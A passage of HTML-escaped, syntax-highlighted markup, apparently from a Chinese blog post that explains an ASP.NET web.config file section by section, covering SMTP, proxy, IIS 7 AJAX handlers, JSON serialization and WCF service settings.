style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;host&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Gao&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;password&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&amp;quot; &lt;span style=&quot;color:red&quot;&gt;userName&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;smtp&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;mailSettings&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;禁用所有缓存&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;requestCaching&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;disableAllCaching&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;true&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;color:maroon&quot;&gt;requestCaching&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;指定代理地址，并对本地访问和 contoso.com 跳过代理。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;defaultProxy&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;proxy&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;usesystemdefault&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;True&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;proxyaddress&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;http://192.168.1.10:3128&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;bypassonlocal&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;True&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;bypasslist&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;address&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;[a-z]+&amp;quot;.contoso&amp;quot;.com&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;bypasslist&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;defaultProxy&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;system.net&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;该节替换在 httpHandlers 和 httpModules 节中添加的与 AJAX 相关的 HTTP 处理程序和模块。该节使 IIS 7.0 在集成模式下运行时可使用这些处理程序和模块。在iis7.0 下运行 ASP.NET AJAX 需要 system.webServer &lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;节。对早期版本的 IIS 来说则不需要此节。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;system.webServer&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;validation&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;validateIntegratedModeConfiguration&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;modules&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;ScriptModule&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;preCondition&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;integratedMode&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Handlers.ScriptModule, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;modules&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;handlers&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;remove&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;WebServiceHandlerFactory-Integrated&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;ScriptHandlerFactory&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;verb&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;*&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;path&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;*.asmx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;preCondition&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;integratedMode&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;ScriptHandlerFactoryAppServices&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;verb&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;*&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;path&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;*_AppService.axd&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;preCondition&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;integratedMode&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;ScriptResource&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;preCondition&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;integratedMode&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;verb&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;GET,HEAD&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;path&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;ScriptResource.axd&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Handlers.ScriptResourceHandler, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;handlers&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;system.webServer&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;ASP.NET AJAX&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;中配置 ASP.NET 服务&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;system.web.extensions&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;配置 JSON 序列化&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;scripting&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;webServices&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;jsonSerialization&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;maxJsonLength&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;5000&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;webServices&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;scripting&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;system.web.extensions&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;对WCF的相关配置&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;system.serviceModel&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;services&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;service&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;WCFStudent.WCFStudentText&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;behaviorConfiguration&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;ServiceBehavior&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt; Service Endpoints&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;endpoint&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;address&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;binding&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;wsHttpBinding&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;contract&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;WCFStudent.IStuServiceContract&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;部署时，应删除或替换下列标识元素，以反映在其下运行部署服务的标识。删除之后，WCF 将自动推导相应标识。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;identity&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span 